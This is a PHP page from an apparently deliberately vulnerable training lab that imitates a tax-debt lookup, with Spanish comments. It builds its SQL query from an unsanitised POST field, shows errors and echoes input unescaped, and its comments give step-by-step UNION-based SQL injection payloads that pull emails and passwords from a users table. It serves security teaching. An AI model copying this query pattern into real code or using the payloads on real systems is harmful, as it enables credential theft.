<?php
/*
 * ============================================================
 * ARCHIVO: web/consulta.php
 * VECTOR:  V1 — SQL Injection (UNION Based)
 * OWASP:   A03:2021 – Injection
 * ============================================================
 * VULNERABILIDAD:
 *   El parámetro $_POST['id_contribuyente'] se concatena
 *   directamente en la query SQL sin ningún tipo de
 *   sanitización ni uso de sentencias preparadas.
 *
 * PAYLOAD DE EXPLOTACIÓN (extraer tabla usuarios):
 *   -1' UNION SELECT 1,email,password,'VENCIDA','2099-01-01' FROM usuarios-- -
 *
 * ¡SOLO PARA USO EDUCATIVO EN ENTORNO CONTROLADO!
 * ============================================================
 */

// --- Conexión a la BD ---
$db_host = getenv('DB_HOST') ?: 'db';
$db_name = getenv('DB_NAME') ?: 'sat_lab';
$db_user = getenv('DB_USER') ?: 'appuser';
$db_pass = getenv('DB_PASS') ?: 'apppassword';

$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

if ($conn->connect_error) {
    // VULNERABILIDAD: Expone detalles del error al usuario
    die("<p style='color:red;padding:20px;font-family:sans-serif;'>
         Error de conexión: " . $conn->connect_error . "</p>");
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de Deudas — SAT-LAB [VULNERABLE SQLi]</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Open Sans', sans-serif;
            background: linear-gradient(135deg, #0654a3 0%, #00a4e4 100%);
            min-height: 100vh;
            padding: 30px 20px;
        }
        .wrapper { max-width: 860px; margin: 0 auto; }
        .top-bar {
            background: #0654a3;
            border-radius: 8px 8px 0 0;
            padding: 14px 22px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 3px solid #00a4e4;
        }
        .top-bar h1 { color: #fff; font-size: 15px; font-weight: 700; }
        .badge-vuln {
            background: #e74c3c; color: #fff;
            font-size: 10px; font-weight: 700;
            padding: 3px 10px; border-radius: 3px; letter-spacing: .5px;
        }
        .panel {
            background: rgba(255,255,255,0.96);
            border-radius: 0 0 8px 8px;
            padding: 28px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
        }
        /* Debug SQL box */
        .sql-debug {
            background: #fff8e1; border: 1px solid #f39c12;
            border-radius: 4px; padding: 12px 14px; margin-bottom: 20px;
            font-family: 'Courier New', monospace; font-size: 12px; color: #7f6000;
            word-break: break-all;
        }
        .sql-debug strong { display: block; margin-bottom: 4px; color: #e67e22; font-size: 10px; text-transform: uppercase; letter-spacing: .5px; }
        h2 { color: #0654a3; font-size: 15px; margin-bottom: 14px; border-bottom: 1px solid #dde8f0; padding-bottom: 8px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { background: #0654a3; color: #fff; padding: 10px 12px; text-align: left; font-size: 11px; text-transform: uppercase; }
        td { padding: 10px 12px; border-bottom: 1px solid #e8edf2; color: #333; }
        tr:hover td { background: #f0f6fc; }
        .PENDIENTE { color: #e67e22; font-weight: 700; }
        .VENCIDA   { color: #e74c3c; font-weight: 700; }
        .PAGADA    { color: #27ae60; font-weight: 700; }
        .no-result { color: #888; font-size: 14px; padding: 20px 0; text-align: center; }
        .sql-error { color: #c0392b; font-size: 13px; padding: 12px; background: #fdf2f2; border: 1px solid #e74c3c; border-radius: 4px; font-family: monospace; }
        .btn-back { display: inline-block; margin-top: 22px; padding: 9px 18px; background: #0654a3; color: #fff; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: 600; }
        .btn-back:hover { background: #044a8e; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="top-bar">
        <h1>📋 Consulta de Deudas Tributarias</h1>
        <span class="badge-vuln">⚠ VULNERABLE — V1 SQLi</span>
    </div>
    <div class="panel">
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['id_contribuyente'])) {

    // ═══════════════════════════════════════════════════════════
    // VULNERABILIDAD CWE-89: CONCATENACIÓN DIRECTA EN LA QUERY
    // El valor de $_POST['id_contribuyente'] se inserta sin
    // ningún tipo de sanitización dentro del string SQL.
    //
    // PAYLOAD UNION-BASED para extraer datos de 'usuarios':
    //   Paso 1 - detectar columnas:
    //     72345678' ORDER BY 5-- -   → OK
    //     72345678' ORDER BY 6-- -   → ERROR (confirma 5 columnas)
    //
    //   Paso 2 - extraer datos:
    //     -1' UNION SELECT 1,email,password,'VENCIDA','2099-01-01' FROM usuarios-- -
    //
    //   Paso 3 - GROUP_CONCAT (todo en una fila):
    //     -1' UNION SELECT 1,GROUP_CONCAT(email),GROUP_CONCAT(password),'VENCIDA','2099-01-01' FROM usuarios-- -
    // ═══════════════════════════════════════════════════════════
    $id_contribuyente = $_POST['id_contribuyente'];  // SIN sanitizar

    $sql = "SELECT id_contribuyente, concepto, monto, estado, fecha_vencimiento
            FROM   deudas
            WHERE  id_contribuyente = '" . $id_contribuyente . "'";

    // VULNERABILIDAD ADICIONAL: La query real se imprime en pantalla
    echo "<div class='sql-debug'>
            <strong>🔍 DEBUG — Consulta SQL ejecutada (solo en laboratorio):</strong>"
            . htmlspecialchars($sql)
          . "</div>";

    echo "<h2>Resultados para: <em>" . $id_contribuyente . "</em></h2>";

    $result = $conn->query($sql);

    if ($result === false) {
        // Muestra el error SQL completo — ayuda al atacante a ajustar el payload
        echo "<p class='sql-error'>❌ Error MySQL: " . $conn->error . "</p>";
    } elseif ($result->num_rows > 0) {
        echo "<table>
                <thead>
                  <tr>
                    <th>Contribuyente</th><th>Concepto</th>
                    <th>Monto (S/.)</th><th>Estado</th><th>Vencimiento</th>
                  </tr>
                </thead>
                <tbody>";
        while ($row = $result->fetch_assoc()) {
            $cls = htmlspecialchars($row['estado']);
            echo "<tr>
                    <td>" . $row['id_contribuyente'] . "</td>
                    <td>" . $row['concepto'] . "</td>
                    <td>" . number_format($row['monto'], 2) . "</td>
                    <td class='" . $cls . "'>" . $row['estado'] . "</td>
                    <td>" . $row['fecha_vencimiento'] . "</td>
                  </tr>";
        }
        echo "</tbody></table>";
    } else {
        echo "<p class='no-result'>No se encontraron deudas para el identificador ingresado.</p>";
    }

} else {
    echo "<p class='no-result'>Acceso incorrecto. Use el formulario de la página principal.</p>";
}
$conn->close();
?>
        <a href="javascript:history.back()" class="btn-back">← Volver</a>
    </div>
</div>
</body>
</html>
